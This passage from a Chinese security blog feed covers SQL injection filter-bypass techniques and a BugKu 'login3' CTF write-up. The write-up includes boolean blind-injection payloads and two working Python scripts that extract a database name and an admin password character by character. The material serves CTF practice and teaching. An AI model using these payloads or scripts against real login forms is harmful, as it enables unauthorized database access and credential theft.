2,1;<br>//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据</p><p>select * from table limit 2 offset 1;<br>//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</p><hr><h4 id="二、sql注入比较符号（-lt-gt-）绕过："><a href="#二、sql注入比较符号（-lt-gt-）绕过：" class="headerlink" title="二、sql注入比较符号（&lt;&gt;）绕过："></a>二、sql注入比较符号（&lt;&gt;）绕过：</h4><hr><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。<br>　　最常见的一个盲注的sql语句：<br><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code><br>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:<br><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p><hr><h4 id="三、sql注入-or-and-绕过："><a href="#三、sql注入-or-and-绕过：" class="headerlink" title="三、sql注入 or and 绕过："></a><strong>三、sql注入 or and 绕过：</strong></h4><hr><p><code>and=&amp;&amp;  or=||</code></p><hr><h4 id="四、sql注入注释符号（-，–）绕过"><a href="#四、sql注入注释符号（-，–）绕过" class="headerlink" title="四、sql注入注释符号（#，–）绕过"></a><strong>四、sql注入注释符号（#，–）绕过</strong></h4><hr><p><code>id=1&#39; union select 1,2,3||&#39;1</code><br>最后的or ‘1闭合查询语句的最后的单引号，或者：<br><code>id=1&#39; union select 1,2,&#39;3</code></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;sql注入绕过详解。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="sql" scheme="http://yoursite.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>BugKu--login3(SKCTF)</title>
    <link href="http://yoursite.com/2019/07/30/BugKu-login3-SKCTF/"/>
    <id>http://yoursite.com/2019/07/30/BugKu-login3-SKCTF/</id>
    <published>2019-07-30T06:35:03.000Z</published>
    <updated>2019-08-03T06:00:58.791Z</updated>
    
    <content type="html"><![CDATA[<p>看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。</p><a id="more"></a><p>所以我们开始注入：<br>首先我们输入admin’:<br><img src="http://i2.tiimg.com/695378/b7fb5ee5afa4b499.png" alt><br>输入admin ‘#，提示密码错误，输入admin’ #,提示非法字符，一看就是过滤了空格，我们单独输入and、union、select、for、from,发现过滤了and、union、for字符。<br><strong>接着我们就需要绕过过滤字符：</strong><br><strong>括号绕过空格：</strong><br>如果空格被过滤，括号没有被过滤，可以用括号绕过。<br>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>例如：</p><p>select(user())from dual where(1=1)and(2=2)</p><p>这种过滤方法常常用于time based盲注,例如：</p><p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p><p><strong>逗号绕过（使用from或者offset）：</strong></p><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);</p><p><strong>等于号=：</strong></p><p>用&lt;&gt;(不等于)绕过。<br>按照以上思路我们使用：</p><p>ascii(substr(database() from 1 for 1)),但是我们发现for也被过滤了。我们发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值。</p><p><img src="http://i1.fuimg.com/695378/1b7736f50af37534.png" alt><br>如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值<br>那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第一位(数字1)的ascii值，为什么这么说呢？admin用户存在，返回1。数字二等于数字一。后面的语句返回0，即1 ^0返回1。说明用户输入栏正确，所以返回password错误。<br>我们写脚本爆出数据库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.89.219.210:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr(database()from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure><p><img src="http://i2.tiimg.com/695378/0853845ddf830fa6.png" alt><br>本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜</p><p>看别人猜的表名为admin，列名为password，真是玄学…</p><p>那就直接爆password：<br>接着们爆出表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.31.85:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of password is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p><img src="http://i1.fuimg.com/695378/2087571c3e5752d6.png" alt><br>我们可以看出爆出了密码，解密skctf123456。</p><p>补充一下知识点：<br>1.ord()函数主要用来返回对应字符的ascii码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ord(<span class="string">"a"</span>)</span><br><span class="line"><span class="number">97</span></span><br><span class="line">&gt;&gt;&gt; chr(<span class="number">97</span>)</span><br><span class="line">&gt; <span class="string">'a</span></span><br></pre></td></tr></table></figure><p>打印字符串</p><p><code>print (“His name is %s”%(“Aviad”))</code></p><p>效果：<br><img src="http://i2.tiimg.com/695378/9cef5b2b60efb76b.png" alt><br>打印整数</p><p>print (“He is %d years old”%(25))</p><p>效果：<br><img src="http://i2.tiimg.com/695378/e9ece54b012a24a4.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="sql" scheme="http://yoursite.com/tags/sql/"/>
    
  </entry>
  
</feed>
